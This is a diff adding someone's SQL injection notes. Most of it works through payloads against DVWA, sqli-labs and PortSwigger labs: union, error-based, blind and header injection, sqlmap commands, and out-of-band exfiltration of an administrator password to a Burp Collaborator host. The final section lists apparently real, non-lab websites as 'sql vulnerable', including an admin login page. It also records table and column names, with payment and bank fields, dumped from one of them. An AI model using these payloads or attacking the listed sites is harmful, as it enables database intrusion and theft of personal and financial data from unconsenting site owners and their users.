@@ -1,0 +1,1119 @@
+1
+At first find sqli and its closing
+\
+'
+"
+
+"SELECT first_name, last_name FROM users WHERE user_id = '1 ' or ' 1 ' = ' 1; 
+
+
+After finding closing try to balance the query using
+#
+--+
+-- space at end
+
+After balancing try to find number of vulnerable columns
+ union all select 1 --+
+ union all select 1,2 --+
+ union all select 1,2,3 --+
+") union all select 1,2,3,4 --+  if you find error here then there you are 3 vulnerable columns
+
+similarlyyou can try for below given codes
+ 
+1'
+1' order by 1#
+1' order by 2#
+1' order by 3#
+%' or 0=0 union select null, database()#
+%' or 0=0 union select user(), database()#
+%' or 0=0 union select version(), database()#
+all   truth union
+
+%' or 0=0 union select null, group_concat(table_name) from information_schema.tables where table_schema='dvwa'#\
+%' or 0=0 union select 1, group_concat(column_name) from information_schema.columns where table_schema='dvwa'& table_name='users'#
+
+
+%' or 1=0 union select null, table_name from information_schema.tables#
+%' or 1=1 union select null, table_name from information_schema.tables where table_name like 'user%'#
+%' or 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name='users'#
+%' or 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users#
+concat(table_name,0x0a,column_name)
+
+Medium
+
+id=0 union select user,password from dvwa.users limit 0,1#&Submit=Submit
+
+
+
+
+
+
+blind sqli dvwa
+
+low
+sqlmap -u “http://192.168.56.101/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --proxy=http://127.0.0.1:8080 --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low”
+--dbs
+--tables
+--columns
+--dump
+--dump-all
+
+medium
+sqlmap -u “http://192.168.56.101/vulnerabilities/sqli_blind/” --proxy=http://127.0.0.1:8080 --cookie=”PHPSESSID=29luilm5c39oukt9ua5ig2e11g; security=medium” --data=”id=1&Submit=Submit”
+
+sqlmap -u “http://192.168.56.101/vulnerabilities/sqli_blind/” -- proxy=http://127.0.0.1:8080 --cookie=”PHPSESSID=29luilm5c39oukt9ua5ig2e11g; security=medium”--data=”id=1&Submit=Submit” -D dvwa -T users --dump
+
+
+high
+sqlmap -u “http://192.168.56.101/vulnerabilities/sqli_blind/cookie-input.php”--proxy=http://127.0.0.1:8080 --cookie=”PHPSESSID=lred0jr6na1vmci2o8160sb5ff; security=high” --data=”id=1&Submit=Submit” -p id --level=5 --risk=3 --dbms=mysql
+
+
+
+
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch
+
+
+
+
+
+
+
+1' and length(database())=4 #
+Library length 4
+1' and ascii(substr(database(),1,1))=100 #
+1'+and+ascii(substr(database(),2,1))=118 #
+1'+and+ascii(substr(database(),3,1))=119 #
+1'+and+ascii(substr(database(),4,1))=97 #
+Library name dvwa
+------------------------------------------------------------------------------
+1' and (select count(table_name) from information_schema.tables where table_schema='dvwa')=2 #
+Number of tables: 2
+1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #
+First table length 9
+1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,2),1))=5 #
+Second table length 5
+------------------------------------------------------------------------------
+1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=117 #
+1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))=115 #
+1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),3,1))=101 #
+1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),4,1))=114 #
+1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),5,1))=115 #
+Table name users
+------------------------------------------------------------------------------
+1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=8 #
+The table has eight fields
+1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='user')=1 #
+1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='password')=1 #
+Inside and outside user and password field
+------------------------------------------------------------------------------
+1' and (select count(*) from users where user='admin' and password='5f4dcc3b5aa765d61d8327deb882cf99')=1 #
+existence user by admin and password For 5 f4dcc3b5aa765d61d8327deb882cf99(password)Field for.
+
+
+
+
+
+
+
+
+
+
+
+SOLI_LABS
+
+
+Exploitation of sqli get based
+
+order by 1
+	 2
+	 3
+	 4
+this represent how many columns sre vulnerable
+union all select 1,2,3
+this will show us that which vulnerable column is reflecting
+
+how to find all databases
+hackbar > union > database > group_concat
+http://192.168.1.34/sqli-labs-master/Less-3/?id=-1') union all select 1,(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA),3 --+
+make the value negligible i.e. id=-1
+
+how to find all tables in databse
+hackbar> unbion > tables> groupconcat
+http://192.168.1.34/sqli-labs-master/Less-3/?id=-1') union all select 1,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x64767761),3 --+
+
+how to find all columns 
+hackbar> union> columns> group concat
+http://192.168.1.34/sqli-labs-master/Less-3/?id=-1') union all select 1,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x7573657273),3 --+
+
+how to find data of any column
+hackbar> union > data > groupconcat 
+http://192.168.1.34/sqli-labs-master/Less-3/?id=-1') union all select 1,(SELECT+GROUP_CONCAT(username,"----",password+SEPARATOR+0x3c62723e)+FROM+dvwa.users),3 --+
+
+
+You are getting error but you are not getting output of union based sqli ---- Error based or double Query based
+lab5
+http://192.168.1.34/sqli-labs-master/Less-5/?id=1' order by 1,2,3 --+   Till 3 no error
+http://192.168.1.34/sqli-labs-master/Less-5/?id=1' order by 1,2,3,4 --+  Here we got error
+http://192.168.1.34/sqli-labs-master/Less-5/?id=-1' union all select 1,2,3 --+  no error
+http://192.168.1.34/sqli-labs-master/Less-5/?id=-1' union all select 1,2,3,4 --+  got an error
+so 3 vulnerable columns but for union it is not reflecting the vulnerable column
+
+so lets just use hackbar to get error based sqli\
+hackbar> error based > getdatabase()
+http://192.168.1.34/sqli-labs-master/Less-5/?id=-1' +AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a) --+
+
+incerase the value of limit to get dname of other databases
+try limit+1,1
+    limit+2,1
+
+if this doesnt give you the output try for double query based sqli 
+http://192.168.1.93/sqli-labs-master/Less-5/?id=-1' +AND(SELECT+1+from(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+DISTINCT+CONCAT(0x7e,0x27,CAST(schema_name+AS+CHAR),0x27,0x7e)+FROM+INFORMATION_SCHEMA.SCHEMATA+WHERE+table_schema!=DATABASE()+LIMIT+5,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),+FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1 --+
+try limit+1,1
+    limit+2,1   and yes this will give you the databases
+
+Now we have to find the table in a particular database
+http://192.168.1.93/sqli-labs-master/Less-5/?id=-1' +AND(SELECT+1+from(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+DISTINCT+CONCAT(0x7e,0x27,CAST(table_name+AS+CHAR),0x27,0x7e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x64767761+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1 --+
+
+try +FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x64767761+LIMIT+1,1
+									2,1
+and yes this will list you tables in the particular database
+
+
+Let us find the column from this particular table
+http://192.168.1.93/sqli-labs-master/Less-5/?id=1' +AND(SELECT+1+FROM(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+DISTINCT+CONCAT(0x7e,0x27,CAST(column_name+AS+CHAR),0x27,0x7e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_schema=0x64767761+AND+table_name=0x7573657273+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1 --+
+
+WHERE+table_schema=0x64767761+AND+table_name=0x7573657273+LIMIT+2,1
+								1,1
+								3,1
+
+And this will you list you the no. of columns in the particular table
+
+
+let us just get the data from columns, at first i will get the data from one of thee column
+http://192.168.1.93/sqli-labs-master/Less-5/?id=1' +AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast(password+AS+CHAR),0x27,0x7e)+FROM+dvwa.users+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1 --+
+
+
+cast(password+AS+CHAR),0x27,0x7e)+FROM+dvwa.users+LIMIT+2,1))
+							3,1
+							1,1
+And yes this will give you data one by one for any of column you mention
+
+
+
+
+
+
+
+
+
+
+
+
+
+Blind Boolean based sqli
+
+Less-8
+
+after putting \ it is not getting me an error but it is just hiding if the error.
+try and 1=1
+try and "a"="a"
+
+http://192.168.1.93/sqli-labs-master/Less-8/?id=1' order by 3 --+
+so there are 3 vuln feilds
+and that we are able to find because of true and false 
+http://192.168.1.93/sqli-labs-master/Less-8/?id=1' and 1=2 --+
+							database()="security" --+
+							substring(database(),1,1)="s" --+
+
+select table_name from information_schema.tables
+id=1′ AND (substr((select table_name information_schema.tables where table_schema=database()limit 0,1) ,1,1)) = E –+
+
+ and (ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1)) = 101 --+
+
+
+
+?id=1' and (select 1 from dual where database() like '%e%')--+
+id=1' and (select 1 from dual where (select table_name from information_schema.columns where table_schema=database() and
+column_name like '%pass%' limit 0,1) like '%')--+
+
+
+This returned true that means there is a table with a column name that has the word ‘pass’ in it.
+Let's guess the table name length. Same concept as before.
+localhost/sqli-labs-master/Less-8/?id=1' and (select 1 from dual where (select table_name from information_schema.columns where table_schema=database() and
+column_name like '%pass%' limit 0,1) like '___')--+
+So,three underscores gave nothing.
+Let's try five.
+localhost/sqli-labs-master/Less-8/?id=1' and (select 1 from dual where (select table_name from information_schema.columns where table_schema=database() and
+column_name like '%pass%' limit 0,1) like '_____')--+
+
+So length of table name is 5.
+localhost/sqli-labs-master/Less-8/?id=1' and (select 1 from dual where (select table_name from information_schema.columns where table_schema=database() and
+column_name like '%pass%' limit 0,1) like '%u%')--+
+
+and (select 1 from dual where (select column_name from information_schema.columns where table_schema=database() and table_name='users' and column_name like '%username%' limit 0,1) like '%')--+
+
+localhost/sqli-labs-master/Less-8/?id=1' and (select 1 from dual where (select password from users where username like '%Dumb%' limit 0,1) like '%D%')--+
+
+
+
+
+(SELECT ascii(SUBSTR((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0),1,1)))=117
+
+
+(SELECT ascii(SUBSTR((SELECT column_name FROM information_schema.columns where table_name='users' LIMIT 1 OFFSET 0),1,1)))=117
+
+
+(SELECT ascii(SUBSTR((SELECT username FROM users LIMIT 1 OFFSET 0),1,1)))=97
+
+
+
+
+
+
+
+Blind time based
+Less-9
+' and sleep(10) --+
+" and sleep(10) --+
+') and sleep(10) --+
+") and sleep(10) and 1=1 --+
+") and sleep(10) and database="security" --+
+") and sleep(10) and substring(database(),1,1)="s" --+
+
+
+Post based SQLi
+
+less 11-LESS14
+
+balancing query in post based 
+
+' #
+' order by 3 #
+' union all select 1,2 #
+' union all select user(),database() #
+
+Let us see exploitation 
+hackbar > union based > database > group concat
+			tables
+			columns
+			dump data
+
+' union all select (SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),2 #
+challenges
+dvwa
+metasploit
+mysql
+owasp10
+security
+tikiwiki
+tikiwiki195
+Your Password:2
+
+' union all select (SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x64767761),2 #
+
+
+
+Less 13
+
+
+
+
+pOST BASED ERROR ND DOUBLE QUERY
+
+if union all select 1,2 # dont work thEn go for error based and double query based sqli
+But the thing is the we have to change + with space since + dont work in Post input field
+
++AND(SELECT 1 from(SELECT COUNT(*),CONCAT((SELECT (SELECT (SELECT DISTINCT CONCAT(0x7e,0x27,CAST(schema_name AS CHAR),0x27,0x7e) FROM INFORMATION_SCHEMA.SCHEMATA WHERE table_schema!=DATABASE() LIMIT 1,1)) FROM+INFORMATION_SCHEMA.TABLES LIMIT 0,1), FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND 1=1
+
+
+lESS-15 pOST  BASED BLIND BOOLEAN
+
+' OR 1=1 #
+" OR 1=1 #
+') OR 1=1 #
+") OR 1=1 #
+' OR database()="security" #
+' OR substring(database(),1,1)="s" #
+			  2,1
+
+
+Less-16 Post based blinfd time
+
+'OR sleep(10) #
+"OR sleep(10) #
+') OR sleep(10) #
+") OR sleep(10) #
+
+") OR sleep(10) and 1=1 #
+		    1=2
+") OR sleep(10) and substring(database(),3,1)="a" #
+
+
+Less 17
+
+admin
+'
+
+' #
+' order by 2 #
+' order by 1 #
+so here it is not showing vulnerable column there yopu can try doubl query injection
+
+
+
+
+Header Based SQLI
+
+if any application will have to store your header into their database there will be header based sqli
+
+Less 18 user agent  and 19 Referer feild
+
+admin
+admin
+
+intercept the request
+
+User agent:Mozilla.....\
+if modification give error then you are set  
+noew try to balance the query 
+'
+' --   ---> [this is --space]
+Well it is not even balancing then you can directly go for blind boollean or blind time based
+
+' OR SLEEP(5) and 'a'='a
+' OR 1=1 and 'a'='a
+' OR 1=2 and 'a'='a
+
+
+
+Cookie based testphpvulnweb
+login and crawl to get and burp> search >cookie and get any of the request with cookie
+cookie:sjdbfjhbf\
+cookie:sjdbfjhbf' -- 
+cookie:sjdbfjhbf" --   ---> this is balancinng since error got hidden after this type of balancing
+cookie:sjdbfjhbf" order by 10 -- 
+cookie:sjdbfjhbf' order by 40 -- 
+cookie:sjdbfjhbf order by 100 -- 
+
+
+it is not fixing then you can go for double query based 
+
+and if not then just check for blind boolean or blind time based 
+
+cookie:sjdbfjhbf' and 'x'='x  this is fixing the query
+cookie:sjdbfjhbf' order by 12 and 'x'='x   this is not fixing so lets just get blind time and blind boolean
+cookie:sjdbfjhbf' and sleep(10) and 'x'='x
+cookie:sjdbfjhbf' and 1=1 and 'x'='x   ---->login
+cookie:sjdbfjhbf' and 1=2 and 'x'='x   ---->logout
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Port Swigger
+
+1
+
+SQL injection - product category filter
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1 
+
+End goal: display all products both released and unreleased.
+
+Analysis:
+
+SELECT * FROM products WHERE category = 'Pets' AND released = 1
+
+SELECT * FROM products WHERE category = ''' AND released = 1 
+
+SELECT * FROM products WHERE category = ''--' AND released = 1 
+
+SELECT * FROM products WHERE category = ''
+
+SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1 
+
+
+
+
+
+
+2
+
+SQL injection - Login functionality
+
+End Goal: perform SQLi attack and log in as the administrator user. 
+
+Analysis
+--------
+
+SELECT firstname FROM users where username='admin' and password='admin'
+
+SELECT firstname FROM users where username=''' and password='admin'
+
+SELECT firstname FROM users where username='administrator'--' and password='admin'
+
+SELECT firstname FROM users where username='admin'
+
+script.py <url> <sql-payload> 
+
+
+
+
+
+3
+
+SQLi - Product category filter
+
+End Goal: determine the number of columns returned by the query. 
+
+Background (Union):
+
+table1      table2
+a | b       c | d 
+-----       -----
+1 , 2       2 , 3
+3 , 4       4 , 5
+
+Query #1: select a, b from table1
+1,2
+3,4
+
+Query #2: select a, b from table1 UNION select c,d from table2
+1,2
+3,4
+2,3
+4,5
+
+Rule: 
+- The number and the order of the columns must be the same in all queries
+- The data types must be compatible
+
+SQLi attack (way #1):
+
+select ? from table1 UNION select NULL
+-error -> incorrect number of columns
+
+select ? from table1 UNION select NULL, NULL, NULL
+-200 response code -> correct number of columns
+
+SQLi attack (way #2):
+
+select a, b from table1 order by 3
+
+
+
+
+
+
+4
+
+SQLi - Product category filter
+
+End Goal: determine the number of columns returned by the query. 
+
+Background (Union):
+
+table1      table2
+a | b       c | d 
+-----       -----
+1 , 2       2 , 3
+3 , 4       4 , 5
+
+Query #1: select a, b from table1
+1,2
+3,4
+
+Query #2: select a, b from table1 UNION select c,d from table2
+1,2
+3,4
+2,3
+4,5
+
+Rule: 
+- The number and the order of the columns must be the same in all queries
+- The data types must be compatible
+
+Step #1: Determine # of columns
+
+SQLi attack (way #1):
+
+select ? from table1 UNION select NULL, NULL
+-error -> incorrect number of columns
+
+select ? from table1 UNION select NULL, NULL, NULL
+-200 response code -> correct number of columns
+
+SQLi attack (way #2):
+
+select a, b from table1 order by 3
+
+Step #2: Determine the data type of the columns
+
+
+select a, b, c from table1 UNION select NULL, NULL, 'a'
+-> error -> column is not type text
+-> no error -> column is of type text
+
+Analysis:
+
+' order by 1--
+-> 3 columns -> 1st column is not shown on the page.
+
+' UNION select NULL, 'KsZXy4', NULL--
+-> 2nd column of type string
+
+' UNION select 'a', NULL, NULL--'
+' UNION select NULL, 'a', NULL--
+
+
+
+
+
+
+5
+
+SQL Injection - Product category filter.
+
+End Goal - Output the usernames and passwords in the users table and login as the administrator user.
+
+Analysis:
+--------
+
+1) Determine # of columns that the vulnerable query is using
+' order by 1--
+' order by 2--
+' order by 3-- -> internal server error
+
+3-1 = 2
+
+
+2) Determine the data type of the columns
+
+select a, b from products where category='Gifts
+
+' UNION select 'a', NULL--
+' UNION select 'a', 'a'--
+-> both columns are of data type string
+
+' UNION select username, password from users--
+
+administrator
+tqx26ugf8jp1g30atsu9
+
+
+
+
+
+
+6
+
+
+SQL Injection - Product category filter
+
+End Goal: retrieve all usernames and passwords and login as the administrator user.
+
+Analysis:
+--------
+
+(1) Find the number of columns that the vulnerable is using:
+' order by 1-- -> not displayed on the page
+' order by 2-- -> displayed on the page
+' order by 3-- -> internal server error
+
+3 - 1 = 2
+
+(2) Find which columns contain text
+' UNION SELECT 'a', NULL--
+` ->**
+
+(3) Output data from other tables
+
+' UNION select NULL, username from users--
+' UNION select NULL, password from users--
+
+' UNION select NULL, version()--
+-> PostgreSQL 11.11 (Debian 11.11-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit
+
+' UNION select NULL, username || '*' || password from users--
+
+carlos*hx8lpsrznosr462ydnvh
+administrator*35v95vbpktdv4c2nqgak
+wiener*0qc4vtnx4o08sr5nsstf
+
+
+
+
+
+
+Lab-07 - SQL injection attack, querying the database type and version on Oracle
+
+SQL Injection - Product category filter
+
+End Goal - display the database version string
+
+Analysis:
+
+(1) Determine the number of columns
+' order by 3 -- -> internal server error
+
+3 - 1 = 2
+
+(2) Determine the data types of the columns
+
+' UNION SELECT 'a', 'a' from DUAL-- -> Oracle database
+
+(3) Output the version of the database
+
+' UNION SELECT banner, NULL from v$version--
+
+SELECT banner FROM v$version
+
+
+
+
+
+
+
+Lab 08 - SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+SQL Injection - Product Category
+
+End Goal - display the database version
+
+Analysis:
+
+(1) Find number of columns
+' order by 3# -> internal server error
+
+3 - 1 = 2
+
+(2) Figure out which columns contain text 
+' UNION SELECT 'a', 'a'#
+
+(3) Output the version
+' UNION SELECT @@version, NULL#
+SELECT @@version 
+
+8.0.23
+
+
+
+
+
+
+
+
+
+
+
+Lab #9 - SQL injection attack, listing the database contents on non-Oracle databases
+
+End Goals:
+- Determine the table that contains usernames and passwords
+- Determine the relevant columns
+- Output the content of the table
+- Login as the administrator user
+
+Analysis:
+
+1. Find the number of columns
+' order by 3-- -> Internal server error
+3 - 1 = 2
+
+2. Find the data type of the columns
+' UNION select 'a', 'a'--
+-> both columns accept type text
+
+3. Version of the database
+' UNION SELECT @@version, NULL-- -> not Microsoft
+' UNION SELECT version(), NULL-- -> 200 OK
+PostgreSQL 11.11 (Debian 11.11-1.pgdg90+1)
+
+4. Output the list of table names in the database
+
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+
+users_xacgsm
+
+5. Output the column names of the table
+
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_mmjttu'--
+
+username_vbzhoe
+password_lttwgp
+
+6. Output the usernames and passwords
+
+' UNION select username_vbzhoe, password_lttwgp from users_mmjttu--
+
+administrator
+9g91jpytvv5c091xpjxc
+
+
+
+
+
+Lab #10 - SQL injection attack, listing the database contents on Oracle
+
+End Goals:
+- Determine which table contains the usernames and passwords
+- Determine the column names in table
+- Output the content of the table
+- Login as the administrator user 
+
+Analysis:
+
+1) Determine the number of columns
+' order by 3-- -> internal server error
+
+3 - 1 = 2
+
+2) Find data type of columns
+' UNION select 'a', 'a' from DUAL--
+-> Oracle database
+-> both columns accept type text
+
+3) Output the list of tables in the database
+
+' UNION SELECT table_name, NULL FROM all_tables--
+
+USERS_JYPOMG
+
+4) Output the column names of the users table
+
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_JYPOMG'-- 
+
+USERNAME_LDANZP
+PASSWORD_DYZWEQ
+
+5) Output the list of usernames/passwords
+
+' UNION select USERNAME_LDANZP, PASSWORD_DYZWEQ from USERS_JYPOMG--
+
+administrator
+c30j8bn7ejg50isvbiie
+
+
+
+
+
+
+Lab 11 - Blind SQL injection with conditional responses
+
+Vulnerable parameter - tracking cookie
+
+End Goals:
+1) Enumerate the password of the administrator
+2) Log in as the administrator user
+
+Analysis:
+
+1) Confirm that the parameter is vulnerable to blind SQLi
+
+select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN'
+
+-> If this tracking id exists -> query returns value -> Welcome back message
+-> If the tracking id doesn't exist -> query returns nothing -> no Welcome back message
+
+select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and 1=1--'
+-> TRUE -> Welcome back
+
+select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and 1=0--'
+-> FALSE -> no Welcome back
+
+2) Confirm that we have a users table
+
+select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select 'x' from users LIMIT 1)='x'--'
+-> users table exists in the database.
+
+3) Confirm that username administrator exists users table
+
+select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator')='administrator'--'
+-> administrator user exists
+
+4) Enumerate the password of the administrator user
+
+select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--'
+-> password is exactly 20 characters
+
+select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select substring(password,2,1) from users where username='administrator')='a'--'
+
+1 2 3 45 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
+52rqbjtjpa749cy0bv6s
+
+
+
+
+
+(SELECT ascii(SUBSTR((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0),1,1)))=117
+
+
+(SELECT ascii(SUBSTR((SELECT column_name FROM information_schema.columns where table_name='users' LIMIT 1 OFFSET 0),1,1)))=117
+
+
+(SELECT ascii(SUBSTR((SELECT username FROM users LIMIT 1 OFFSET 0),§1§,1)))=§97§
+
+
+
+
+
+
+
+
+Lab #12 - Blind SQL injection with conditional errors
+
+Vulnerable parameter - tracking cookie
+
+End Goals:
+- Output the administrator password
+- Login as the administrator user
+
+Analysis:
+
+1) Prove that parameter is vulnerable
+
+' || (select '' from dual) || ' -> oracle database
+
+' || (select '' from dualfiewjfow) || ' -> error
+
+2) Confirm that the users table exists in the database
+
+' || (select '' from users where rownum =1) || ' 
+-> users table exists
+
+3) Confirm that the administrator user exists in the users table
+' || (select '' from users where username='administrator') || ' 
+
+
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' 
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' 
+-> Internal server error -> administrator user exists
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='fwefwoeijfewow') || ' 
+-> 200 response -> user does not exist in database
+
+4) Determine length of password
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) || ' 
+-> 200 response at 50 -> length of password is less than 50
+-> 20 characters
+
+5) Output the administrator password
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,,1)='a') || ' 
+-> w is not the first character of the password
+
+wjuc497wl6szhbtf0cbf
+
+
+
+
+
+
+Lab #13 - Blind SQL Injection with time delays
+
+Vulnerable parameter - tracking cookie
+
+End Goal:
+- to prove that the field is vulnerable to blind SQLi (time based)
+
+Analysis:
+
+select tracking-id from tracking-table where trackingid='OVmpehhTPt2iCL19'|| (SELECT sleep(10))--';
+
+' || (SELECT sleep(10))-- -x
+' || (SELECT pg_sleep(10))-- 
+
+
+
+
+
+
+
+Lab #14 - Blind SQLi with time delays and informational retrieval
+
+Vulnerable parameter - tracking cookie
+
+End Goals:
+- Exploit time-based blind SQLi to output the administrator password
+- Login as the administrator user
+
+Analysis:
+
+1) Confirm that the parameter is vulnerable to SQLi
+
+' || pg_sleep(10)--
+
+2) Confirm that the users table exists in the database
+
+' || (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end)--
+
+' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+3) Enumerate the password length
+
+' || (select case when (username='administrator' and LENGTH(password)>20) then pg_sleep(10) else pg_sleep(-1) end from users)--
+-> length of password is 20 characters
+
+4) Enumerate the administrator password
+
+' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+13ipnob7l2dkjp3drryy
+
+
+
+
+
+
+
+Lab #15 - Blind SQL injection with out-of-band interaction
+
+Vulnerable parameter - Tracking cookie
+
+End Goal - Exploit SQLi and cause a DNS lookup
+
+Analysis:
+
+cgwihkkm49dt3sgk9lufyyb6mxsngc.burpcollaborator.net
+
+' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://cgwihkkm49dt3sgk9lufyyb6mxsngc.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
+
+
+
+
+
+
+
+
+
+Lab #16 - Blind SQL injection with out of band data exfiltration
+
+Vulnerable parameter - tracking cookie
+
+End Goals:
+1) Exploit SQLi to output the password of the administrator user
+2) Login as the administrator user
+
+Analysis:
+akyjt827n6zbq7z8zvtfg6bft6zwnl.burpcollaborator.net
+
+
+' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.akyjt827n6zbq7z8zvtfg6bft6zwnl.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)-- 
+
+0fpkzao19uq428v3bbde
+
+
+
+
+
+Auth BYpass
+
+select * from users where username ='admin';--' And Password = 'password' filters or
+				     admin';				  filters or --
+				     admin';					  or and = like >< --
+		    /**/union/**/select/**/*/**/from/**/Users/**/LIMIT/**/1;      or and = like >< -- admin
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+copal
+
+sql vulnerable websites
+
+
+http://berkeleyrecycling.org/page.php?id=1
+
+
+https://www.transpakcorp.com/company.php?id=752
+
+
+http://clascertification.com/index.php?id=1%27
+
+
+https://www.globaltextilepartners.com/admin/login.php
+
+
+http://ugceresources.in/view-lecture.php?cid=4'
+
+
+https://www.globaltextilepartners.com/admin/login.php
+
+www.comand.edu.pk
+www.jaasnneelstudio.com
+
+
+lagan karao
+
+information_schema
+la5hjas_s8gjam1
+
+
+adminlogin
+banners
+caste
+category
+city
+cms
+deleted_request
+expressinterest
+featured_list
+googleanalysis
+homepagebanners
+homepageleftbanners
+homepagerightbanners
+marquee
+matchalert
+membershipplan
+news
+orders
+paiddetails
+payment_details
+payment_options
+photoprotectrequesters
+r
+
+
+Paidid
+Poid
+Pmatriid
+Pname
+Pemail
+Paddress
+Ppaymode
+Pactivedate
+Pplan
+Pplanduration
+Pnocontct
+Pamount
+Pbankdet
+Pstatus
+test
+memtype
+
+
